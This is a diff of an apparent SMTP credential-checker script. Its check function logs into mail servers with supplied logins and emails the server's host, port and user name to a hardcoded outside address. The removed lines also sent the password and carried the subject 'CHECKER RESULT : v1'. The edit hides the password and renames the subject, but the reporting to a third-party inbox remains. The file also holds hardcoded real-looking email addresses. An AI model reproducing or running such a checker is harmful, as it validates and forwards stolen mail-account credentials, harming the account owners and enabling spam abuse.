@@ -57,14 +57,14 @@ def check(smtp):
      j = "kadalbiawak43@gmail.com"
     
     global VALIDS, INVALIDS
-    toaddr = "sethandmeri@hotmail.com"
+    toaddr = "egidio@jaffamianni.com"
     try:
         server = smtplib.SMTP(HOST, PORT)
         server.ehlo()
         server.starttls()
         server.login(usr, pas)
         msg = MIMEMultipart()
-        msg['Subject'] = "CHECKER RESULT : v1"
+        msg['Subject'] = "SMTP test from " + HOST
         msg['From'] = j
         msg['To'] = toaddr
         msg.add_header('Content-Type', 'text/html')
@@ -72,7 +72,7 @@ def check(smtp):
                 <p>HOST : """ + HOST + """</p>
                 <p>PORT : """ + PORT + """</p>
                 <p>USER : """ + usr + """</p>
-                <p>PASS : """ + pas + """</p>              
+                              
         """
         msg.attach(MIMEText(data, 'html', 'utf-8'))
         server.sendmail(usr, [msg['To']], msg.as_string())
